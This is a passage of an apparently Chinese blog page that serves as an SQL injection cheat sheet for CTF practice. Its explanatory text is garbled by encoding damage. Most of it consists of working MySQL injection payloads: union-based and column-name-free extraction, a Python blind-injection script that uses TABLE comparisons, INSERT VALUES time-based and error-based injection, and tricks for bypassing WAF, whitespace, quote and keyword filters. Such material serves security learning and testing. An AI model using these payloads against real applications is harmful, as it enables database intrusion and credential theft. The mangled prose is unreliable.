åˆ™è¯´æ˜æ­¤è¡¨ä»æœªè¢«è®¿é—®ï¼‰</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;</span><br><span class="line">#ç»Ÿè®¡æ‰€æœ‰è®¿é—®è¿‡çš„è¡¨æ¬¡æ•°:åº“å,è¡¨å,è®¿é—®æ¬¡æ•°</span><br><span class="line"><span class="keyword">select</span> table_schema,table_name,<span class="built_in">sum</span>(io_read_requests<span class="operator">+</span>io_write_requests) io <span class="keyword">from</span> sys.schema_table_statistics <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">table_schema,table_name <span class="keyword">order</span> <span class="keyword">by</span> io <span class="keyword">desc</span>;</span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿æ¥çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>,db,command,current_statement,last_statement,<span class="type">time</span> <span class="keyword">FROM</span> sys.session;</span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰æ›¾è¿æ¥æ•°æ®åº“çš„IP,æ€»è¿æ¥æ¬¡æ•°</span><br><span class="line"><span class="keyword">SELECT</span> host,total_connections <span class="keyword">FROM</span> sys.host_summary;</span><br><span class="line"># åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨</span><br><span class="line"><span class="keyword">SELECT</span> QUERY <span class="keyword">FROM</span> sys.x$statement_analysis <span class="keyword">WHERE</span> QUERY REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> QUERY <span class="keyword">FROM</span> `sys`.`statement_analysis` <span class="keyword">where</span> QUERY REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div><h4 id="performance-schemaè¡¨"><a href="#performance-schemaè¡¨" class="headerlink" title="performance_schemaè¡¨"></a>performance_schemaè¡¨</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line">#åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨</span><br><span class="line"><span class="keyword">SELECT</span> digest_text <span class="keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="keyword">WHERE</span> digest_text REGEXP DATABASE();</span><br><span class="line">#åŒ…å«è¡¨æ–‡ä»¶è·¯å¾„çš„è¡¨</span><br><span class="line"><span class="keyword">SELECT</span> file_name <span class="keyword">FROM</span> `performance_schema`.`file_instances` <span class="keyword">WHERE</span> file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232923.jpg"                      alt="image-20220707221836224"                ><figcaption>image-20220707221836224</figcaption></figure></p><blockquote><p>ä¸Šè¯‰è¡¨æ ¼ä¸­è™½ç„¶æœ‰èƒ½å¤ŸæŸ¥åˆ—åçš„è¡¨ï¼Œä½†æ˜¯æŸ¥å‡ºæ¥çš„æ•°æ®éƒ½ä¸å…¨ï¼Œå½“çŸ¥é“flagæ‰€åœ¨çš„åº“å’Œè¡¨åæ—¶ï¼Œä½†æ— æ³•è·å–åˆ°åˆ—åï¼Œå°±éœ€è¦åˆ©ç”¨æ— åˆ—åç›²æ³¨äº†</p></blockquote><h4 id="joinæ— åˆ—åæ³¨å…¥-payload"><a href="#joinæ— åˆ—åæ³¨å…¥-payload" class="headerlink" title="joinæ— åˆ—åæ³¨å…¥ payload"></a>joinæ— åˆ—åæ³¨å…¥ payload</h4><p><strong>join â€¦ using(xx)</strong></p><p>æŸ¥è¡¨å</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>Union all ä¸union çš„åŒºåˆ«æ˜¯å¢åŠ äº†å»é‡çš„åŠŸèƒ½</p></blockquote><p>æŸ¥åˆ—å(é€‚ç”¨äºé€—å·è¢«è¿‡æ»¤)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">union</span> <span class="keyword">select</span> é‡å‘½åæ³•</span><br><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a, <span class="number">1</span> <span class="keyword">as</span> b, <span class="number">1</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)x limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line">#æ— é€—å·ï¼Œæœ‰<span class="keyword">join</span>ç‰ˆæœ¬</span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> `a`)m <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span> `b`)n <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span> `c`)t <span class="keyword">where</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)x;</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b)c<span class="comment">--+</span></span><br><span class="line"># è·å–ç¬¬ä¸€åˆ—çš„åˆ—å</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c<span class="comment">--+</span></span><br><span class="line"># è·å–æ¬¡åˆ—åŠåç»­åˆ—å</span><br></pre></td></tr></table></figure></div><h4 id="union-selecté‡å‘½åæ³•"><a href="#union-selecté‡å‘½åæ³•" class="headerlink" title="union selecté‡å‘½åæ³•"></a><code>union selecté‡å‘½åæ³•</code></h4><p>ä¸è·å–åˆ—åæƒ…å†µä¸‹æŸ¥åˆ—,ä»¥æŸ¥ç¬¬äºŒåˆ—ä¸ºä¾‹</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"># ä¹Ÿå¯ä»¥æŸ¥å¤šä¸ªåˆ—</span><br><span class="line"><span class="keyword">select</span> concat(`<span class="number">2</span>`,<span class="number">0x2d</span>,`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)a limit <span class="number">1</span>,<span class="number">3</span>;</span><br><span class="line"># <span class="number">0x2d</span>ä¼šè½¬æ¢æˆå­—ç¬¦<span class="string">&#x27;-&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œå°†ç¬¬äºŒåˆ—å–åˆ«åä¸ºb(å¦‚æœåå¼•å·&#96;æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä¸å–åˆ«åï¼Œç›´æ¥ç”¨â¬‡ï¸)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> â€¦â€¦</span><br></pre></td></tr></table></figure></div><p>ç»“å°¾çš„aå¯ä»¥æ›¿æ¢æˆä»»æ„å­—ç¬¦ï¼Œè¿™æ˜¯ç”¨æ¥å‘½åçš„</p><p>åŸç†æ˜¯è”åˆæŸ¥è¯¢æ—¶åˆ—åæ˜¾ç¤ºçš„æ˜¯å‰ä¸€ä¸ªselectçš„ç»“æœï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªselectæ˜¯<code>select 1,2 as b,3 </code>å°†åˆ—åé‡å‘½åä¸º1 b 3ï¼Œç„¶åå†å°†è¿™ä¸ªæ–°è¡¨å‘½åä¸ºaï¼Œå†è¿›è¡ŒæŸ¥è¯¢</p></blockquote><h3 id="selectè¢«è¿‡æ»¤"><a href="#selectè¢«è¿‡æ»¤" class="headerlink" title="selectè¢«è¿‡æ»¤"></a>selectè¢«è¿‡æ»¤</h3><p><a class="link"   href="https://www.freebuf.com/articles/web/275528.html" >åŸºäºmysql8ç‰¹æ€§çš„sqlæ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>mysql 8.0.19<code>æ–°å¢è¯­å¥</code>table </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">table</span> users; <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></div><blockquote><p>tableä¸èƒ½åŠ whereå­å¥ï¼Œä¸å…è®¸è¡Œè¿‡æ»¤ï¼Œæ˜¾ç¤ºæ‰€æœ‰åˆ—ï¼Œä½†å¯ä»¥ç”¨æ¥ç›²æ³¨è¡¨å</p></blockquote><h4 id="tableç›²æ³¨è„šæœ¬"><a href="#tableç›²æ³¨è„šæœ¬" class="headerlink" title="tableç›²æ³¨è„šæœ¬"></a>tableç›²æ³¨è„šæœ¬</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#orio1e</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">result=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">result+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">dic=[<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,]  <span class="comment"># å­—å…¸</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line"><span class="built_in">print</span>(dic[j])</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:8010&quot;</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªå­—æ®µ</span></span><br><span class="line"><span class="comment">#ç»“æœ:1</span></span><br><span class="line">payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line"><span class="comment">#çˆ†ç¬¬äºŒä¸ªå­—æ®µ</span></span><br><span class="line"><span class="comment">#ç»“æœ:guest</span></span><br><span class="line">payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line"><span class="comment">#çˆ†ç¬¬ä¸‰ä¸ªå­—æ®µ</span></span><br><span class="line"><span class="comment">#ç»“æœ:123456</span></span><br><span class="line"><span class="comment">#å› ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦å®Œæˆåé•¿åº¦ç›¸ç­‰åˆåˆ¤æ–­ä¸ºå‡ æ‰€ä»¥æœ€åä¸€ä¸ªå­—ç¬¦åº”ä¸ºå…¶ä¸‹ä¸€ä¸ªå­—æ¯</span></span><br><span class="line"><span class="comment">#ä½†æ˜¯è¿™ä»…é™æœ€åä¸€ä¸ªå­—æ®µ</span></span><br><span class="line"><span class="comment">#æ‰€ä»¥æ­£ç¡®ç»“æœæ˜¯we1c0mehacker </span></span><br><span class="line">payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(url=url,data=payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">20</span>:])</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;emmmmm&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;no&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="comment">#è¿”å›å‡æ—¶è¡¨ç¤ºä¸Šä¸€ä¸ªå­—æ¯å³ä¸ºæ­£ç¡®ç»“æœ</span></span><br><span class="line">result+=dic[j-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div><blockquote><p>æ³¨æ„å¾€å‰å›æº¯</p><p>mysqlæ¯”è¾ƒï¼Œä»ç¬¬ä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯æ¯”è¾ƒasciiçš„å¤§å°ï¼Œä¸€æ¬¡å¾€å ,å¹¶ä¸”å¤šåˆ—çš„æ¯”è¾ƒæ—¶ä»ç¬¬ä¸€åˆ—çš„ç¬¬ä¸€ä½å¼€å§‹çš„</p><p>mysqlä¸­å¯¹charå‹å¤§å°å†™æ˜¯ä¸æ•æ„Ÿçš„ï¼Œç›²æ³¨çš„æ—¶å€™è¦ä¹ˆå¯ä»¥ä½¿ç”¨hexæˆ–è€…binaryã€‚</p></blockquote><h4 id="valuesæ³¨å…¥"><a href="#valuesæ³¨å…¥" class="headerlink" title="valuesæ³¨å…¥"></a>valuesæ³¨å…¥</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;$log&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;testsetset&#x27;</span><span class="keyword">or</span> sleep(<span class="number">5</span>)) # <span class="string">&#x27;);</span></span><br><span class="line"><span class="string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span><span class="operator">+</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)) # <span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure></div><p>å¯ä»¥åˆ©ç”¨è”åˆæ³¨å…¥ä»£æ›¿order by</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232669.jpg"                      alt="image-20220707223820177"                ><figcaption>image-20220707223820177</figcaption></figure></p><h3 id="WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´"><a href="#WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´" class="headerlink" title="WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´"></a>WAFç»•è¿‡â€“æœåŠ¡å™¨è§£ææ¼æ´</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p><blockquote><p>apacheï¼ˆphpï¼‰è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid&#x3D;2 çš„å†…å®¹ã€‚Tomcatï¼ˆjspï¼‰è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid&#x3D;1 çš„å†…å®¹ã€‚</p><p>æˆ‘ä»¬å¾€å¾€åœ¨tomcat æœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFï¼Œå› æ­¤å¯ä»¥ä¼ å…¥ç¬¬ä¸€ä¸ªä¸ºåˆæ³•å‚æ•°ï¼Œç¬¬äºŒä¸ªé‡‡ç”¨æ³¨å…¥</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232308.jpg"                      alt="image-20220708192908674"                ><figcaption>image-20220708192908674</figcaption></figure></p></blockquote><h3 id="ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼è¢«è¿‡æ»¤</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/æ›¿ä»£ç©ºæ ¼</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09 TAB é”®ï¼ˆæ°´å¹³ï¼‰</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0a æ–°å»ºä¸€è¡Œ</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0c æ–°çš„ä¸€é¡µ</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0d <span class="built_in">return</span> åŠŸèƒ½</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0b TAB é”®ï¼ˆå‚ç›´ï¼‰</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">a0 ç©ºæ ¼</span></span><br><span class="line">() ä»£æ›¿ç©ºæ ¼ï¼Œåœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚</span><br></pre></td></tr></table></figure></div><blockquote><p>%a0æ˜¯ä¸€ä¸ªä¸æˆæ±‰å­—çš„ä¸­æ–‡å­—ç¬¦ï¼Œå› æ­¤æ­£åˆ™åŒ¹é…æ—¶ä¸ä¼šå½“ç©ºæ ¼è¿‡æ»¤ï¼Œè€Œè¿›å…¥sqlè¯­å¥åï¼Œmysqlä¸è®¤ä¸­æ–‡å­—ç¬¦ï¼Œå½“ç©ºæ ¼å¤„ç†</p></blockquote><h3 id="è¿‡æ»¤å•å¼•å·"><a href="#è¿‡æ»¤å•å¼•å·" class="headerlink" title="è¿‡æ»¤å•å¼•å·"></a>è¿‡æ»¤å•å¼•å·</h3><p>è½¬ä¹‰ç¬¦å·åŠæ³¨é‡Šæ²¡è¢«è¿‡æ»¤æ—¶ï¼Œå°†usernameé—­åˆçš„å•å¼•å·è½¬ä¹‰ï¼Œåœ¨passwordçš„è¾“å…¥ä¸­æ’å…¥å¸ƒå°”ç›²æ³¨è¯­å¥</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin\</span><br><span class="line">password<span class="operator">=</span><span class="keyword">or</span> <span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span>#</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27; or 2&gt;1#&#x27;</span>;</span><br></pre></td></tr></table></figure></div><h4 id="å¤šç§æ³¨é‡Šç¬¦"><a href="#å¤šç§æ³¨é‡Šç¬¦" class="headerlink" title="å¤šç§æ³¨é‡Šç¬¦"></a>å¤šç§æ³¨é‡Šç¬¦</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="comment">--%20</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">#</span><br><span class="line"><span class="comment">--+</span></span><br><span class="line"><span class="comment">-- -</span></span><br><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line">;</span><br><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br><span class="line">;\x00</span><br></pre></td></tr></table></figure></div><h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><ul><li><p>å¤§å°å†™ç»•è¿‡</p></li><li><p>åŒå†™ç»•è¿‡ï¼ˆä¸»è¦ç”¨äºæºç ä¸­ä½¿ç”¨replaceæ›¿æ¢é»‘åå•ï¼‰</p></li><li><p>ç¼–ç ç»•è¿‡</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>å³<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸º<span class="type">CHAR</span>(<span class="number">101</span>)<span 